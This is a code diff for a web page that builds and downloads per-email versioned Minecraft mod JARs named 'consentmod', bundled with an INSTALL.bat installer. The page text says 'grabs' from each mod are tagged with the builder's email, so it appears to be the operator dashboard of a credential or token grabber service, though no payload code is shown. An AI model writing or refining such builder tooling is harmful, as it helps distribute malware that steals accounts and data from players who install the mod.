@@ -41,9 +41,7 @@ export default function BuildPage() {
   }, []);
 
   const handleConfirmEmail = () => {
-    if (email && email.includes('@')) {
-      setEmailConfirmed(true);
-    }
+    if (email && email.includes('@')) setEmailConfirmed(true);
   };
 
   const handleDownload = async () => {
@@ -64,11 +62,13 @@ export default function BuildPage() {
       try {
         const res = await fetch(`/api/download?email=${encodeURIComponent(email)}`);
         if (res.ok) {
+          const disposition = res.headers.get('content-disposition');
+          const fileName = disposition ? disposition.split('filename=')[1]?.replace(/"/g, '') : 'consentmod.jar';
           const blob = await res.blob();
           const url = URL.createObjectURL(blob);
           const a = document.createElement('a');
           a.href = url;
-          a.download = 'consentmod-1.0.0.jar';
+          a.download = fileName;
           document.body.appendChild(a);
           a.click();
           document.body.removeChild(a);
@@ -110,7 +110,7 @@ export default function BuildPage() {
             </div>
             <div style={{ fontSize: 12, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 8 }}>YOUR EMAIL</div>
             <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 12 }}>
-              This email will be baked into your mod. All grabs from your mod will be tagged with this email.
+              This email is baked into your mod. All grabs will be tagged with it. Each download auto-increments the version.
             </div>
             <div style={{ display: 'flex', gap: 8 }}>
               <input
@@ -129,8 +129,8 @@ export default function BuildPage() {
               </button>
             </div>
             {emailConfirmed && email && (
-              <div style={{ marginTop: 10, fontSize: 12, color: colors.green, display: 'flex', alignItems: 'center', gap: 4 }}>
-                ✓ Email configured — mod will send grabs tagged to <strong>{email}</strong>
+              <div style={{ marginTop: 10, fontSize: 12, color: colors.green }}>
+                ✓ Configured — grabs will be tagged to <strong>{email}</strong>
               </div>
             )}
           </div>
@@ -159,14 +159,34 @@ export default function BuildPage() {
           </div>
         </div>
 
+        <div style={{ background: colors.panel, borderRadius: 12, border: `1px solid ${colors.border}`, padding: 20, marginBottom: 20 }}>
+          <div style={{ fontSize: 14, fontWeight: 600, color: colors.text, marginBottom: 10, display: 'flex', alignItems: 'center', gap: 8 }}>
+            <span>📦</span> How It Works
+          </div>
+          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 16 }}>
+            <div style={{ fontSize: 13, color: colors.textDim }}>
+              <div style={{ color: colors.green, fontWeight: 600, marginBottom: 4 }}>1. Confirm Email</div>
+              Enter your email and click Confirm. This tags your grabs.
+            </div>
+            <div style={{ fontSize: 13, color: colors.textDim }}>
+              <div style={{ color: colors.green, fontWeight: 600, marginBottom: 4 }}>2. Download JAR</div>
+              Each download creates a new versioned JAR (consentmod-0.0.X-YYYY.jar).
+            </div>
+            <div style={{ fontSize: 13, color: colors.textDim }}>
+              <div style={{ color: colors.green, fontWeight: 600, marginBottom: 4 }}>3. Run INSTALL.bat</div>
+              Extract the JAR, run INSTALL.bat — it auto-places your config.txt in .minecraft/consentmod/.
+            </div>
+          </div>
+        </div>
+
         <div>
           <div style={{ fontSize: 12, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 12 }}>YOUR MODS</div>
           <div style={{ background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, padding: '14px 18px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
             <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
               <span style={{ fontSize: 20 }}>📄</span>
               <div>
-                <div style={{ fontSize: 14, fontWeight: 500, color: colors.text }}>consentmod-1.0.0.jar</div>
-                <div style={{ fontSize: 12, color: colors.textDim, marginTop: 2 }}>Latest build · Email: {emailConfirmed ? email : 'Not configured'}</div>
+                <div style={{ fontSize: 14, fontWeight: 500, color: colors.text }}>consentmod-*.jar (versioned per email)</div>
+                <div style={{ fontSize: 12, color: colors.textDim, marginTop: 2 }}>Auto-increments on each download · Email: {emailConfirmed ? email : 'Not configured'}</div>
               </div>
             </div>
             <button onClick={handleDownload} disabled={!emailConfirmed} style={{ background: 'transparent', border: `1px solid ${emailConfirmed ? colors.border : '#333'}`, color: emailConfirmed ? colors.text : '#555', padding: '8px 16px', borderRadius: 8, fontSize: 13, cursor: emailConfirmed ? 'pointer' : 'not-allowed', display: 'flex', alignItems: 'center', gap: 6 }}>
@@ -178,15 +198,15 @@ export default function BuildPage() {
 
       {downloading && (
         <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(0,0,0,0.8)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999 }}>
-          <div style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 16, padding: '40px 48px', textAlign: 'center', minWidth: 360 }}>
+          <div style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 16, padding: '40px 48px', textAlign: 'center', minWidth: 400 }}>
             <div style={{ fontSize: 18, fontWeight: 600, color: colors.text, marginBottom: 8 }}>Building your mod...</div>
-            <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 24 }}>Configuring with <strong style={{ color: colors.green }}>{email}</strong> and preparing download</div>
+            <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 24 }}>Versioning for <strong style={{ color: colors.green }}>{email}</strong> and packaging with INSTALL.bat</div>
             <div style={{ background: '#1a1b24', borderRadius: 8, height: 8, overflow: 'hidden', marginBottom: 16 }}>
               <div style={{ background: colors.green, height: '100%', width: `${progress}%`, borderRadius: 8, transition: 'width 0.1s linear' }} />
             </div>
             <div style={{ fontSize: 13, color: colors.green, fontWeight: 600 }}>{progress}%</div>
             {progress >= 100 && (
-              <div style={{ fontSize: 12, color: colors.textDim, marginTop: 12 }}>Download starting...</div>
+              <div style={{ fontSize: 12, color: colors.textDim, marginTop: 12 }}>Download starting — extract JAR and run INSTALL.bat</div>
             )}
           </div>
         </div>
